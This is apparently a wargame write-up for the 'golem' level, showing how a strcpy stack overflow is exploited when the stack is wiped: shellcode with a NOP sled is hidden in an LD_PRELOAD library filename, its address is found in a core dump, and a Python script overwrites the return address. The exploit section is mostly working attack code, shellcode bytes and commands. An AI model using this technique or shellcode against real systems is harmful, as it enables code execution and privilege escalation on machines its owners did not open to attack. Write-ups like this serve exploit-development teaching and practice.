# Vulnerability
```c
char buffer[40];
strcpy(buffer, argv[1]);
```
This program uses strcpy() that does not check boundary so I can overwrite SFP & RET address.

The protection is:
```c
memset(buffer, 0, 44);
memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
```
This code makes me not able to use stack address anymore.

# Exploitation
I am also not able to use environment variables but there is a method.

It is using LD_PRELOAD which is a shared library that program loads and executed.

I will give NOP & Shellcode in LD_PRELOAD and set RET address to LD_PRELOAD's address:
```bash
[skeleton@localhost skeleton]$ touch ./tmp.c
[skeleton@localhost skeleton]$ gcc tmp.c -fPIC -shared -o "/home/skeleton/`python -c 'print "\x90"*30+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`"
[skeleton@localhost skeleton]$ 
[skeleton@localhost skeleton]$ export LD_PRELOAD="/home/skeleton/`python -c 'print "\x90"*30+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`"
```
Now, I have to know LD_PRELOAD's address by checking core file:
```
0xbffff620:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff630:	0x90909090	0x90909090	0x5e11eb90	0x32b1c931
0xbffff640:	0xff0e6c80	0x01e98001	0x05ebf675	0xffffeae8
```
# Payload
```python
import os
from struct import *

filename = "/home/skeleton/golem"

payload = ""
payload = payload + "\x90" * 40
payload = payload + "AAAA" # SFP
payload = payload + "\x0c\xf6\xff\xbf" # RET

os.execv(filename, [filename, payload])
```
